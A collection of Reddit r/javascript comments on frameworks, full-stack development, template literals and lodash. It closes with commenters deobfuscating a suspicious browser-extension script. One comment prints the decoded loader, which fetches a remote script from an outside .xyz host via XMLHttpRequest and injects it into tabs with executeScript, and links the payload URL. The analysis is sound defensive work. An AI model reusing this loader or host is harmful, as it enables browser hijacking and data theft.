The lacking of spacing in the examples is bothering me more than it should. 
&gt;If you're looking for something to put on a resume, then learn the big ones, but if you're just wanting to start writing apps, the thin ones are usually more than sufficient and typically faster/smaller. It's a bit more complicated than this, unfortunately. It's harder to say with any certainty that we'll still be using the smaller ones in 2 years as opposed to something like angular 1, which, like it or not, is not going to go anywhere for a while. 
I must admit I did not test png images with an alpha channel yet, if more of your files are like that it could be the reason why. Setting the strength to 1 for png resulted in an error still. Png is rather finicky when it comes to glitches, a single edit easily corrupts a file, perhaps I should drop support all together. Using [this regular good old jpeg](http://f.cl.ly/items/1T0L0M1w2s1Q3r3P3j1n/forrest.jpg) the effect should be [rather prominent](http://f.cl.ly/items/371g0g051v2j1g0o3M1F/preview.jpg). Thanks for checking it out :)
I'm so confused by this comment! The timer should be adjustable?? :/
Every page load is 1 page load. Even if you didn't build a SPA (which you are) the browser would cache the asset bundle. But that's moot. You are building a SPA so assets like Angular are getting loaded once per visit, and probably once per multiple visits since the browser will cache it. 40k is tiny and should only be of concern for sites whose target market is on 2G. 
If I'm doing vanilla js, I'm not going to be doing a lot of OOP surrounding the elements. That was the impetus behind the mostly-obsolete [prototype framework](http://prototypejs.org/learn/extensions.html). 
I exported as a jpeg, that's a freaky effect. It's working more often than not, but still fails occasionally. I figured I could take a look at what was actually going on behind the scenes, but ended up finding this instead (line 34): var match = response.substring(0,24).match(/[JFIF|GIF|PNG]+/i); That's a really weird regex IMHO, not to mention the seemingly arbitrary substring call. Are you sure this is doing what it's supposed to, and if so, would you mind explaining? I would have expected something like `/\.(JPEG|JPG|GIF|PNG)$/i`... Edit: `var support = /[jpeg|png|gif]+/i;` (line 3) also looks weird.
The code is from here: https://greasyfork.org/en/scripts/6553-ebay-collection-only-filter/code
As I understand it's random times right? In that case selecting your average and/or max, would be nice.
See my response to /u/nesukun I'm talking about js run time, not download time, particularly as it relates to devices w/ not-as-fast-as-latest-chrome javascript engines.
You can use a tagged template to get rid of the unnecessary tabs/spaces. Have a look at oneLineTrim in the common-tags npm module. https://www.npmjs.com/package/common-tags
&gt; A single average image on the internet is bigger than that That's why I don't fill my mobile web UI with average images.
Off the top of my head ESLint - http://eslint.org/docs/rules/prefer-template AIRBnB Style guide - https://github.com/airbnb/javascript#es6-template-literals Eclipse IDE - code templates use Template Literals 
Nope, the mode mentioned above is with "offline compilation", which compiles the templates during build time. So at startup your app starts executing directly, without having to go through a compilation step.
&gt; A recent StackOverflow survey showed that developers overwhelmingly define themselves as full stack web developers. It also showed that 85.3% of us know at least some JavaScript. And you addressed this earlier, because most of them are not actually good developers. They kinda do front or backend, not both well. There's no such thing as back-end javascript developer anymore than there's a front-end javascript developer, ***you still have to know other technologies and techniques that are unique to that side of the stack***. Javascript is a very VERY small piece of the puzzle. It's no surprise that you'd identify as full-stack considering you ignored everything beyond your language of choice. edit: And what was the point of the article anyways? You didn't come to a conclusion, you didn't prove any of the points that you mentioned and you certainly didn't prove that full-stack wasn't a bullshit term.
Each time execution reaches an array initializer, a new array is created (this fact, by the way, is partially why I do not use the phrase "array literal" even though the spec uses it); now to answer the question in your title, a few other methods do mutate the arrays they're called on, like `pop`, `shift`, `unshift`, `reverse`, `sort`, and `splice`.
To be fair, if my experience w/ Angular is worth anything, maintaining several-years-old Angular 1 codebases for a job is probably not going to be nearly as enjoyable as joining a team working with a more modern stack.
how do i create an alert in jquery
I've only had to use typeof a handful of times myself and I can't say that I have really been bitten by a lack of types in javascript either. I guess I was really trying to get at the fact that even if you have never had the need for types in javascript it doesn't change the fact the javascript does in fact have and use types they are just hidden and aren't really checked by the runtime. Do I want stronger types in javascript? Hell no! I really think that's what makes javascript so great and powerful. I seem to see a lot of people who want to see typescript's type syntax ported over to javascript and I really don't understand that viewpoint. In that regard /u/lordnuada was correct, if you want strong types use a strong typed language... like Typescript ;) I think tools, like Typescript (and others like Facebook's flow), are a good way to make working with large javascript applications in a team setting easier. I think there is defintely a point where you hit diminishing returns with it though. If the application is relatively small and not that complex, or if it is something only you will be working on it might just end up getting in your way and be more hassle than its worth. But I will say in the short time I have been using it on a large application I went from liking typescript to loving it. There is something quite freeing about changing a method signature hitting save and seeing 43 errors popup with line numbers telling you what you just broke.
Now now, I didn't say you were going to *enjoy* it. 
Also check out panda for chrome, feeds of multiple outlets such as hackernews, jsecho and others, all there when you open a new tab. Oh and also detox for Facebook, check those two out! 
React + Redux + (Some) ES6. Angular 1 won't become obsolete anytime soon because there are so many existing applications that will need to be supported for years to come, but nobody is using it for new projects. Angular 2 is still in beta. React is still gaining momentum and there's almost zero chance of it being obsolete in two years. Redux is the most popular library for handling state/data at the moment. A benefit of learning React + Redux is that you'll learn a lot about structuring applications that will help you in the future, regardless of what framework you're using 5 years from now, especially since the JS community seems to be moving in a more functional direction. Concerning ES6, I would only be concerned with learning enough to write idiomatic React/Redux code. Pick up other features only as you need to. 
And then disappear when I click anything else :( . I have the screen real estate for them to keep the sidebar open, and have tons of videos being shown aka what they have now. I wouldn't mind them styling it differently, but changing the function like this (adding clicks for actions) is annoying. 
https://github.com/bolshchikov/js-must-watch
The [`preventDefault` method](https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault) on events, when used inside an event listener function, will prevent the default action of the event from occurring. --- In most browsers, the event inside an event listener is passed in as the listener's first argument, but in oldIE, it's a global variable called `event`; a common pattern in an event listener goes something like this: function listener(evt) { var e = evt || window.event; // more code } The [`addEventListener` method](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener) is used to listen for particular events on particular elements, or descendants of those elements, or the `window` or `document` objects; the first argument is the name of the event, the second is the event listener function, and the third is whether to use the capturing phase (defaults to `false`, which means bubbling phase, the same phase that old-style `on-` event-handler properties use; older browsers required this parameter). --- It looks like your `formatPHONE` and `formatSSN` methods are intended to be used as event listeners, and you should keep in mind that the element the event listener is fired on is `this` (or `event.currentTarget`), rather than a second argument passed into your function; based on your use of the `keyCode` property, it looks like you should use an event like `'keydown'` or `'keypress'`, and you should attach the event listeners on the relevant input elements or an ancestor thereof. --- Finally, you might want to explicitly allow only digits to be entered, rather than just filtering out common problem characters like `-` (for SSN and Phone) or `()` (for Phone).
What do you have against the term "full stack" developer?
I just refactored some of that because it wasn't exactly right, the substring is to prevent false positives. I'm looking for JFIF because that's the jpeg file header name, also for some reason jpeg sometimes has some whitespace in front of the file type header, so there's that (and why I chose a substring of 24). The last one is gone, turned out it was obsolete.
It's not that bad if you don't have to switch versions. I had to upgrade my lodash dep to even get lodash-fp and that was mildly painful on a mid-size enterprise application, but it's certainly possible with a couple hours of work. Honestly though I just bit the bullet and moved to [Ramda](http://ramdajs.com/0.21.0/index.html), which is what Lodash-fp is emulating anyhow. It's a much more complete (imo) version of the same ideas.
&gt; you certainly didn't prove that full-stack wasn't a bullshit term I agree in general, but I don't see how this needs proving?
I hadn't thought to, but maybe as a small side project: "Jurassic Ipsum"?
That's odd, I used an iOS device to test it. Which demo isn't working? Also, I just updated the demo link in the OP to make it stronger. Perhaps that'll do it.
Stop being obtuse, you know what I meant: when loading local content is the job at hand, native apps can do it faster and more reliably than websites. If a website is your only option then of course you use it.
Unfortunately that doesn't solve the issue of whitespace from template literals ending up inside your js bundle. To get rid of that you'd need some sort of preprocessor that statically removes the whitespace from the source code.
Just because W3achools fixed a bunch of errors that were pointed out to them, doesn't mean everything is magically ok. Everything about the site says to me they don't really understand the stuff they write about.
Yeah I did look for the file name until I tested with an `example.com/image` url. Thanks a lot for the tip, that explains everything.
It's certainly better than it used to be, but I'm still wary of it. The site always gave me the impression they don't really know the technologies they write about. I emailed them several times about the PHP MySQL injection, they didn't do anything about it until I actually wrote the code for them. So I just don't trust that any page is accurate.
Nice addition, thanks!
You could also write it non-curried if you're not going to be utilizing the curried nature: const nameTag = (class, skid, nm) =&gt; ...
halp
I don't think full stack is bullshit. On the contrary, is something all web developers should thrive to become. Developers claiming to be "specialists" are actually "limited".
I think it's the correct amount of bother. My guess is the developer is new. Which is fine. Now he knows we don't like his style and he can choose to make it better or ignore us. *[edit] He apparently is not new at all. He's quite the old hat.*
Or it could be his editor (me) was stupid and didn't set up the syntax highlighter with a large enough font and line spacing. Fixed. Sorry. (well, at least partially my fault)
Ipsum is filler you use for demos and to flesh out a page while prototyping.
How surprising. The only language that is supported by browsers is a language that a lot of developers know. Coincidentally, every company in the world has web developers. Huh. It's almost like, hrm, they have to know the language to do "shiny stuff" in the browser.
I thought CSS modules was purely a CSS thing, not JavaScript?
that
&gt;I don't think full stack is bullshit. On the contrary, is something all web developers should thrive to become. &gt;Developers claiming to be "specialists" are actually "limited". Not true at all. There are so many java, php, .net, ruby, and other back-ends that all require a front-end built in javascript. A javascript developer *can* specialize in front-end javascript and never write a single line of back-end code and still be extremely valuable to a company. Most back-end developers are terrible at front-end code and there is enough to know about both sides to be able to focus on one or the other. "Full stack" often equates to "jack of all trades, master of none" and there are so many aspects of web development that it does make sense to focus on front-end if that's what someone is good at.
I don't know, I think the syntax is distinctive enough that it pops right out to me as an arrow function. Now if I had to type "arrow_function" every time I wanted to use one, that would be annoying. Also, I feel like it's too "identifier-like" and not distinctive enough.
After reading this and then browsing the headlines on the rest of that site, I would not be surprised if css-perverts was somehow involved. 
You can do it with methodologies like BEM or let JS do it for you.
TBPH, I think this would actually be better than standard lorem ipsum text because you can't read it. You sit there hopping across the page/screen, but you don't get the real reading feel. This is reading. It's still junk, but it's reading. 
If you're going to do that, i'd say to do it with a bunch of different movies. get a main domain like "notyouripsum.io" and then do this with everything from "Saving Private Ryan" to Niell Degrasse Tyson's "Cosmos" Comedies with classic lines would probably be better. . . like Ghostbusters or Dude Where's My Car.
As it encapsulates all of the component's dependencies in the native Custom Elements API, which can be used anywhere, in any framework (or no framework at all). Your `mars-weather` component could be written in React, Angular, Vue, or none at all. Granted that including React for each component is a huge overhead, however using [Preact](https://github.com/developit/preact) you could significantly reduce the filesize without taking the approach mentioned below. With the webcomponents standard, three approaches are introduced to solve the issue of modularisation: * [Custom Elements](http://www.html5rocks.com/en/tutorials/webcomponents/customelements/), which is what `Standalone` concentrates on, and allows you to add custom elements with their own behaviour. `Standalone` merely allows you to write your components in React by bridging the gap between React and Custom Elements &amp;mdash; you can already write your own vanilla implementations without any library or framework; * [HTML Imports](http://www.html5rocks.com/en/tutorials/webcomponents/imports/), which is what Polymer uses for each dependency to explicitly specify its dependency on Polymer. If you have several components all referencing the same Polymer file, then only one is downloaded, and all of the rest are fetched from cache. Nevertheless there is absolutely nothing to stop you from using `Standalone` with HTML Imports, it's just not an integral part of `Standalone`. * [Shadow DOM](http://www.html5rocks.com/en/tutorials/webcomponents/shadowdom/), which provides style encapsulation, and can be achieved by using [Keo](https://github.com/Wildhoney/Keo/blob/master/docs/SHADOW_DOM.md). Again, `Standalone` doesn't focus on this.
* react did not really plan for css3 animations * angular has a nice collection class * angular mixes js-logic and html :[, react uses a transpiler :[
I think the bar was set high by the last team leader. Who knew more about JS than anyone else on the team. 
I've been wanting to build something with Aurelia, but I can't figure out how it's change detection system works. Is the entire state stored in the root component and anything under it should just change that?
No I'm talking about an actual CSS spec, not a userland implementation. Edit: I was thinking of [Web Components](http://w3c.github.io/webcomponents/spec/custom/)
Does anyone really set out to become a "full stack" js developer? It's more the purview of the hobbyist, small team, and solo developer who can't afford to divide up his/her workload since there's no one to divide it with. In my experience becoming "full stack", to whatever degree a developer does, is an organic process. Sometimes you have an idea for a front-end thing, but you need some back-end stuff to make it work. So you learn enough to make it work. I imagine that's how most people are, at least in the freelance and hobbyist community, there's just no call for thinking about specializing and compartmentalizing like you're a cog in a giant machine when you aren't part of a giant machine. 
with a smirk i'd say "Just a different lorem ipsum". He smirks and shakes his head cuz i'm always doin shit like this, and then we go on with our day.
**Am I missing something super obvious?** Yeah kinda, your code here: var server = require('browser-sync').create(); server.init(); module.exports = server; what you've done is expose the method for creating a new server globally but you're not doing anything with it. See the API docs: https://www.browsersync.io/docs/api/ To create a reusable server instance you must use the create method, but you also need to pass it a *name* so you can reference it later: &gt; var bs = require("browser-sync").create('My server'); Then in your individual task files you can the [.get method](https://www.browsersync.io/docs/api/#api-get) There are other methods you can use if you want to get more in depth and check if a server instance is running such as .has or .active 
I wouldn't say I "set out" to become one, but that's the end result. I'm a self-taught developer in everything from BASIC to C to PHP to Javascript. After getting a job with PHP, Javascript quickly became a necessity. The recent push for NodeJS for both server and command line utilities has seen me learn technologies on both sides of the line, effectively putting me into "Full Stack" territory. At no point did I think, "I need to study to become useful on both sides," but I also never specifically decided to study *any* language for any purpose other than enjoyment. Need of a career (and money) is why I do it professionally, but not why I studied.
Good thinking. I'm gonna have to binge this weekend.
Also just as an afterthought before you proceed any further, i would upgrade to node v6 the latest LTS version and also start using gulp4.
&gt; You're going to want to change 1 piece at a time and make sure it works before moving on to the next piece anyhow. Unit tests *should* make this a pretty simple process
The lodash/fp package is modular so you can require just the methods you need var fp = require('lodash/fp'); var array = require('lodash/fp/array'); var map = require('lodash/fp/map'); If you're in the browser by default it will pre-wrap the existing `_` reference but you can restore the old one and assign fp to a new variable with var fp = _.noConflict(); 
I didn't downvote anyone in this thread, but I find it pretty tone deaf to advocate vanilla JS to someone who specifically says they feel behind in trends.
I stand corrected. That's a valid point you've made.
Pretty cool, nice idea to edit the b64 encoding. You should cross post to /r/glitch_art as well, if you haven't. I wonder if it would be possible to data mosh animated gifs without actually breaking them. So they would still be animated, but they would just be glitched. Right now it's random whether they keep working or not.
This question has been asked 4 million times. Search the subreddit 
I find talk about the myth of full-stack developers to be tiring, mainly because it implies I don't exist, and not existing would put anyone to sleep. No, the problem is that I genuinely don't think I'm exceptional, I'm just a born generalist. I like to dabble and understand things. I also thrive on discovering shortcuts that accelerate my understanding. I've worked with people who are better than me at nearly everything I do. Better data analysts, UX people, better UI people, better visual designers, better HTML, CSS, JavaScript, Django, Python etc. But what is consistent is how often I surprise people with what I can do. Being a generalist doesn't mean I can't do these things to a relatively high standard, it just means I'm much slower at it, context-switching is a massive problem and my ramp-up time continues to be a cause of frustration for me. I also rarely do all these things on the same project (except my personal ones), but I move between the various layers of the stack pretty freely. When it comes to building an end-to-end web product, I mainly draw the line at doing dev-ops (it doesn't interest me all that much, though I do have a lot of interest in scaling problems and architecture), and I prefer to have specialists at every layer of the stack - it doesn't matter how much you think you know, you need someone to sanity check and review your work. I'm not special, i'm only one person and can't deliver more than one person's worth of work. I've also worked with people with similar skill-sets to me, which hopefully makes this all sound a little less ridiculous. I've never heard of a full-stack architect (where full-stack includes UX and design), but that's the closest way of describing what I do.
That part I get (thanks to you. seriously thank you). I just discovered the below though: 1 function List(){ 2 } 3 List.all = []; 4 List.all 5 // [] This qualifies as a property of a function itself right? It can be used to store say instances?
Well, there are tons of job listings where they are specifically seeking someone to do full-stack development, so if you'd like to have one of those jobs you should probably learn both.
The `lodash/fp` module is based off of other functional libraries too and even has familiar aliases. It's a bit more than just flipped params and curried methods. The fp modules are immutable, have capped iteratee args, and offer method alternatives for traditional variadic `lodash` methods. The fp modules are [super customizable](https://github.com/lodash/lodash/wiki/FP-Guide#convert) to boot!
For assistance you should hit up the [Lodash gitter chat](https://gitter.im/lodash/lodash). There's plenty of folks to offer a helping hand.
Nope, just shits and giggles.
Does this sort of overlap with how people use closures? It seems way easier than setting up a closure to isolate a function's inner variables from another or others (which in many closure teaching examples is some sort of counter).
Thanks for the detailed response. So, this is similar to polymer and web components with an underpinning based upon reactjs?
Because it doesn't really have a huge impact, lots of libraries default to debug builds as well. Turning this off is definitely worth doing but lots of people are unlikely to notice the difference unless your app is pretty heavy.
In my oponion you should learn React. There are two different versions of Angular and they are both pretty different to each other, so if you want to work as an AngularJS developer then you will need to know both. With React there is currently only one version and it's pretty easy to understand.
I grew up in the 80s with BASIC and C. I've done everything from COBOL to C# since then and I count myself lucky when I can dig into JavaScript. Though, I really have wanted to get into Haskell because I love some of the concepts and challenges.
I do both and I'm not sure I would make that argument
Thanks for sharing, I didn't know that.
I do both as well; I don't see how they aren't. Of course there are differences but we aren't talking about the difference between Web development and kernel hacking here.
Have you tried RxJS and ngrx?
Well, on the front-end side of things, people have certainly tried, and pretty much unerringly failed to replace javascript. The closest we've come that the community at large embraced was language extensions that will never be on the standards track, like jsx and typescript. On the back end, javascript has to compete with some seriously established frameworks from other languages, and I don't think it's quite there yet. Node is fantastic for some things, but it's definitely not a panacea for a javascript dev.
I would say I did as I had an interest in UI and math and wanted to be in charge of the complete solution. I eventually ended up becoming a CSA but I never get bored of any area of programming, it's all equally fascinating. However, I hate ops like the plague and am very thankful for the rise of services like Heroku.
The differences are huge. Remember that the two largest use cases for Javascript are DOM manipulation and REST/AJAX consumption; the latter is possible in Node, but Node has no concept of DOM, and that's huge. Meanwhile, browser Javascript will never interact with the host OS -- great for maintaining security for the end user, but that same barrier also makes front end development unique enough from Node development. And, even if both versions of JS had the same features, UI developers still have to be concerned with CSS, markup, other issues regarding layout and browser rendering; meanwhile, UI devs don't generally concern themselves with sysadmin issues that backend devs tend to. Javascript does offer overlap, but to say there's little difference is naive.
I'll parrot what some others have said... if you aren't there already, get good at Javascript first. Once you do, picking up new frameworks quickly, and being able to evaluate their strengths and weaknesses will be something that you can do. IMO though, learn React. Angular is a mess (2 versions in use and a lot of unnecessary bloat imo). React is simpler but does what it does extremely well. You will have to implement some things that Angular gives you yourself, but this usually just means you will have to find and choose the right library to add on. I just started using react-native to build a cross platform app and it is amazing how effecient my development has been so far. I went from having no knowledge of React to starting a tutorial and not even finishing it then just reading some docs and having a multi-view navigable iOS/Android app working in a few hours. 
Kind of... but the deeper you get into vanilla JS the easier it is to understand and evaluate frameworks. Learning JS now will make learning Angular or React or any other framework a lot easier and a lot more efficient. Learning JS now will make understanding what's going on in frameworks a lot easier as well, which becomes quite important when things break, or you want to do something that the framework doesn't make easy out of the box. If you just jump straight into Angular, that will be all that you understand. And then in the future, if Angular dies, or the only good jobs you can find are in some other thing, you'll have to start all over again. To be capable of keeping up with the trends you need to put some work in first. So if anything, advocating learning one framework before learning the basics will end up keeping you behind.
That is precisely why ng devs are paid more
Doesn't node have cheerio or something like that? There are use cases for working server-side with the DOM. I do my backend development mostly in C# so I can't talk about the node world much. But anyway, yeah, I did not say they are the same or that if you can do one you can necessarily do the other, but I do think that they are closely related and understanding both helps you come up with more sensible designs.
I don't think JSPM comes super easily with those things yet. Quick google search brought up one issue on the subject: https://github.com/geelen/jspm-server/issues/1 But honestly, are those really make-or-break issues? I think the real make or break issue would be having your issues be super complicated when they didn't have to be. I'd take a predictable, relatively easy to understand tool without some bells and whistles over one that I find hard to understand. Live reload still works for me (I also even use browser automation built into firefox straight from my editor). However, I can understand if those features make it worth sticking with webpack. 
In other words, this is a joke. There is no Vanilla JS framework, just the DOM. Figures.
That's pretty much how I did it. I set out to be a front end developer, but I got tired of back end developers taking too long to give me the APIs I needed or saying X can't be done. I said fuck it, if you can't do it, I'll just do it myself. 
The two are quite different. One is based in presentation, and one is based in databases and business logic. The expertise needed to deal with browser APIs, mouse clicks, rendering bottlenecks as well as dealing with browser inconsistencies is not part of back-end engineering. There are a whole set of problems on the front-end that simply do not exist on the back-end. It's practically "apples and oranges" when you're talking about front-end and back-end.
OK, but saying two things are "related" is not the same as saying they are "the same." Neither the front-end nor the back-end exist in a vacuum except in non-typical edge cases and a great many people do work in both environments.
It is a huge pain in the ass; however the developer of hapi keeps his meticulously clean: https://github.com/hapijs/hapi/blob/master/npm-shrinkwrap.json He even goes so far as to hard the code the dependencies of dependencies to ensure a constant environment. Do we need to go that far? Probably not. I know recently mongodb and newrelic pushed versions that broke everything to hell and had to retract those. In the case of mongodb it took 10 days while everyone here was running around the office trying to figure out what was going on. I use it myself when needed but I'm to the point now where my automated API tests will tell me if something breaks and I use ^ for all my versions and skip the shrinkwrap.
You can also write a helper currying function that will allow you to call it either way. A simple one (that will work for simple functions with all their arguments specified upfront, and no "optional" arguments) const curry = (f, ...args) =&gt; (f.length &lt;= args.length) ? f(...args) : (...more) =&gt; curry(f, ...args, ...more); ...then... const autocurriedFunc = curry(func); And now autocurriedFunc can be called with all its arguments at once, or one at a time. It'll keep returning a function until they're all there.
React doesn't do that anymore!
Functions are objects, and as objects can have their own properties. The `prototype` is a special kind of such a property for some functions, but not all. Mostly added automatically, during creation, for user-defined, non-method, non-lamda/arrow functions. Examples of functions that would have a prototype: function () {} // expression, anonymous or named function MyFunc () {} // declaration new Function() // new function from constructor class MyClass {} // classes, anonymous or named function* MyGen () {} // generator Functions that would not have prototypes: isNaN // core api functions Math.cos // core api methods () =&gt; {} // lamda/arrow functions { myMeth() {} } // object literal methods class { myMeth() {} } // class methods With the exception of the generator (which is itself a factory function for creating instances of itself without `new`, and as of ES7, `new` has been disallowed for use with them), those with their own `prototype` can be used as constructors for creating object instances. The other functions cannot. Those that aren't constructors are still function objects, though. Function objects, just like almost every other object in JavaScript, have a "prototype" that represents their inheritance hierarchy. Technically, this property is _internal_ to the object, and referenced in the spec as the `[[Prototype]]` property. When you see the double brackets like that, it means the property is internal to the object and generally not exposed user code. Another example of this is `[[PrimitiveValue]]` in Object primitives - something you may run across in the console: new String('foo') //-&gt; String {0: "f", 1: "o", 2: "o", length: 3, [[PrimitiveValue]]: "foo"} Historically browsers have exposed `[[Prototype]]` through the `__proto__` property in objects, though up until ES6 it was not standard, and even in ES6 its only in _Annex B: Additional ECMAScript Features for Web Browsers_ rather than something defined for all runtimes. The same value can be obtained through the standard `Object.getPrototypeOf()`. The key here is that the `prototype` property in functions is _NOT_ the same as the functions' `[[Prototype]]`. Functions, as objects, inherit values through their `[[Prototype]]`. The value that may get automatically created and stored in `prototype` is used for the objects that the function creates as a constructor. Those objects have their `[[Prototype]]` set to this object. To make the connection back to the constructor, the automatic `prototype` object is also given a `constructor` property of that constructor function. This gets inherited if constructed instances reference a `constructor` property of their own because it will be found in the instances `[[Prototype]]` which is the same object in the constructor function's `prototype`. Functions don't care about the `prototype` property they have. It doesn't matter to them. It's only there for `new` - the thing that makes new objects out of these functions which can be constructors. It's `new` that makes a new object, then sets that object's `[[Prototype]]` to the constructor's `prototype` value. This is through convention - the convention that `new` knows to look for the prototype to be used for a new instance as being in the location of the `prototype` property of the function used as the constructor. Functions do care about their own `[[Prototype]]`. This is how they inherit things like `call()` and `bind()`. For functions, this can be found through `Function.prototype`. That object inherits from `Object.prototype` so its `[[Prototype]]` is `Object.prototype`. These are all separate from the function's own `prototype` property. And the only reason we're seeing the `prototype` property again is through that same convention. Only functions can be used as constructors. You can do this: function X(){}; y = new X; because `X` is a function. `y` then becomes an _object_ created by `X` as a constructor. You cannot do: z = new y because `y` is not a function. But lets say it somehow was. What would happen to `z`? Well, if `y` were constructable, it would need to have been created with an automatic `prototype` property. This represents the holder of shared definitions that objects created by `y` would all inherit. By default this would have one property already, a `constructor` that equals `y`. Then `z` would be a new object that would inherit that `constructor` value - this because its `[[Prototype]]` is `y.prototype`. TL;DR: The internal `[[Prototype]]` property is the "prototype" that defines inheritance. The `prototype` value you see on functions is what is given to objects created by those functions as constructors to be what their `[[Prototype]]` references. The functions, as Function objects, have their own `[[Prototype]]` which is separate from that `prototype` property as the `prototype` is only for objects they construct.
On its own, I don't mind the term, however I find it invites people who have spent a few weeks / months with some full stack framework like Ruby on Rails to consider themselves 'full stack' developers, when in reality they are a nickel sized pancake in a frying pan. I kid, mostly, but sometimes it feels like asking someone what karate belt they're working on and they respond with "all of them".
React != React Native
that
I'm considering Aurelia.
Angular 2 is near the top of my list of SPA frameworks to build implementations with, but I get real irritable when I have to figure out a build process to try out a front-end tech. 
Sure, but that problem exists with a lot of terms related to programming. Someone could open up notepad, paste in some html from the internet, and wham bam they have a web page! They're a web developer now! I see "full stack" as meaning you generalize your knowledge more. In this sense, it's a very useful term to contrast with specialists.
&gt; In the absence of feedback, I am left wondering how everyone else is getting along, or how their users are. By avoiding JavaScript on the server-side like the plague.
I just did a [dbmonster implementation](https://github.com/lhorie/mithril.js/tree/rewrite/examples/dbmonster/angular) with it without using its build toolchain. Maybe that can help you? Just be aware that their docs are fairly useless right now.
For those who keep up with the dev community, he is a relatively well-known figure. I don't expect everyone (or even most people) to know who he is, I simply mentioned him as a quick Google search for those who aren't familiar would clearly indicate that he's far from what is being described here as "limited" in spite of the fact he calls himself a front end developer.
I'd go along with that. I found the initial learning curve pretty steep. Worth it though. Once you know it, in 5 minutes you can do a lot.
Next months article "The Fall of the Full Stack JavaScript Developer"
I just clicked on the article in order to actually visit an xyz tld for the first time.
It requires polyfills even though I'm on Chrome, which is surprising. It also requires RxJS, so it feels more internally complex than Angular 1. The error handling system is very good at pinpointing where errors occurred, but the error descriptions are uselessly generic. This is a problem because Stack Overflow is littered w/ answers using syntax from alpha versions, which does not currently work, and does not throw useful error messages when used. The problem of incomprehensible descriptions also affects the docs. Most things I looked at lacked overview descriptions, and method/property descriptions were extremely short and filled with unexplained jargon. Component lifecycle methods are difficult to understand and did not satisfy my use case (measure render performance). Had to do an ugly hack for that. There's no need for `$scope.$apply` inside a native `setTimeout`, and there's no need for a `$timeout` dependency. It feels icky that they are overwriting `setTimeout` but overall this is a better experience than Angular 1. Most of the API lives in subnamespaces of the `ng` namespace, but their locations are not reflected in the docs, so I had to dig in console to find even basic things like `ng.core.Component`, `ng.common.CORE_DIRECTIVES` and `ng.platform.browser.bootstrap(AppComponent)`. This was the most annoying part, save for a funny wtf moment (quite literally, as I found an undocumented thing called `ng.instrumentation.wtfLeave`). Once things worked, they worked well. Performance is very good once you opt into production mode and my code is far cleaner than the React dbmon implementation. The one wart is the stringly-typed template system (which meant ugly multiline string concatenation). I could theoretically use a template file or a ES6 template string, but the former does not work without a local server (and would require an extra network call if it did use a server), and the latter does not work without a transpiler in IE. Generally, I would describe the experience as mildly annoying, but I actually managed to get what I wanted working. For comparsion, I would describe my Ember experience as infuriatingly frustrating (I was not able to get past Ember CLI installation, let alone get a dbmon version working). 
React. absolutely forget Angular. And learn via React Native. 
Yep, that sums it up well. As with many open source projects I do, it's a experimental and a proof-of-concept, but there's absolutely no reason why it/they couldn't be used today. For HTML Imports the current status is a little mixed, due mostly to still favouring a concatenation of dependencies and files instead of fetching smaller individual files. Polymer espouses [Vulcanize](https://github.com/Polymer/vulcanize) for reducing requests, however in the coming months/years during the transition to HTTP 2.0, we'll begin to favour the fetching of many small files, instead of one concatenated monolith.
One problem I have with SCU are functions. Let's say I have a row component with an onCellClick callback property. In the row render method I have: {this.props.items.map(item =&gt; &lt;Cell onClick={() =&gt; this.props.onCellClick(item)} /&gt; )} This creates a new function on every render. How can I prevent that from happening? 
You have basically every possibility that you have with an Html website with a node backend. 
 {this.props.items.map(item =&gt; &lt;Cell onClick={this.props.onCellClick} item={item} /&gt; )} Just pass the item/id/whatever down as a prop and call the click handler inside the component. 
I'm always a bit confused as to what people mean when they say "full stack"â€”it means different things based on who you ask. If it just means *programming*, and just frontend and backend, then it's surely possible (even not too difficult) to be an excellent full stack developer, but in my view a proper definition is much more inclusive of various different technologies. For that reason, seeing "full stack" on someone's CV always makes me skeptical. For sure, there are some absolutely excellent full stack developers out there, but keeping fully up-to-date with both frontend and backend (not to mention related technologies, like containerization, server administration, AWS, high perf, security, etc) is difficult. Anyone's claim to be able to do that requires scrutiny. A lot of these technologies are, to me, requirements to be a great developer, and without them, the term "full stack" doesn't mean much. Being well versed in many different technologies is a must to work in any serious tech company, but I'd still rather have people around who have a hard specialization in a specific corner of the stack. Things move too fast for one person to be on the cutting edge in every area (except a few very special individuals). And that's fine. No need for anyone to beat themselves up over not knowing everything.
All of the while loops are picking specific characters out these ridiculous mess of strings. It then looks like those selected characters are then concatenated to call some sort of function (which also gets some info out of the mess of strings, the call to `lfmmdj` gets back some plain-english string - I'd imagine.) If you got the code from an add-on, then it may be using your browser's add-on API to make some sort of call.
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/glitch_art] [X-post from r\/javascript: Glitch JS - add glitches to your images in the browser](https://np.reddit.com/r/glitch_art/comments/4htkx4/xpost_from_rjavascript_glitch_js_add_glitches_to/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))* [](#bot)
You can decrypt the strings with the function below. I can take a deeper look this evening. I am currently on mobile http://pastebin.com/qypfwei8
http://localvoid.github.io/react-dbmon :)
*Edit: /u/Mydayyy beat me to reversing the obfuscation...* Well I used the `lfmmdj` function against the script and reversed the obfuscation. You can see it's including a script and executing it. I haven't dug through it, but it's [here](http://nuyipala.xyz/cigesut/juner.js) at `http://nuyipala.xyz/cigesut/juner.js`. A quick glimpse shows a lot of facebook related DOM actions, possibly including more scripts or sending things somewhere. var main = this; var kcemq = "chrome"; var nzhda = "management"; var blymmi = "getSelf"; var rvjuev = "installType"; var fhuhk = "development"; var kprbp = "parseInt"; var axiap = "Object"; var mowyx = "1"; main[kcemq][nzhda][blymmi](function(jvwzo) { if (jvwzo[rvjuev] != fhuhk) { var jzbli = "4"; var hilhtx = "200"; var xnmop = "code"; var ymnrg = "tabs"; var yyhbmk = "onUpdated"; var mmwvj = "addListener"; var evlxt = "get"; var vhejwn = "url"; var jbzqo = "complete"; var ovzbgj = "status"; var sgjcjn = "GET"; var vkrngy = "onreadystatechange"; var pufxeg = "XMLHttpRequest"; var uuujqt = "executeScript"; var xcyqi = "id"; var ssuqo = "responseText"; var hblft = "readyState"; var ayzff = "open"; var zapjqi = "send"; var olreuz = "http://nuyipala.xyz"; var nunbav = "/cigesut"; var lawnb = "/juner.js"; } main[kcemq][ymnrg][yyhbmk][mmwvj](function(pganwr) { /* crap here*/ }); }); function lfmmdj(phwlsq) { /* crap here */ }
